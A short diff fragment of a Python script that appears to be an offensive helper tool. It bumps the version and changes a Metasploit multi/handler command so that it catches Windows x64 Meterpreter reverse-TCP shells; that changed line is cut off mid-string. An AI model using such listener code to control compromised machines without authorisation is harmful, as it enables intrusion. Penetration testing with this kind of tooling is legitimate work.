@@ -43,12 +43,12 @@ banner = r"""
 ██║   ██║██╔═══╝ ╚════██║    ██║     ██╔═══╝
 ╚██████╔╝██║     ███████║    ╚██████╗███████╗
  ╚═════╝ ╚═╝     ╚══════╝     ╚═════╝╚══════╝
-                                        v1.0
+                                        v1.2
 """
 
 def meterpreter_listener():
     # Define the command to run
-    command = 'msfconsole -q -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 5757; exploit -j"'
+    command = 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0>
 
     # Use the subprocess module to run the command
     try:
@@ -81,6 +81,8 @@ elif choice == "2":
     nc_listener()
 else:
     hacker_print(f"{GREEN}Invalid choice. Exiting...")
+
+
 
 
 
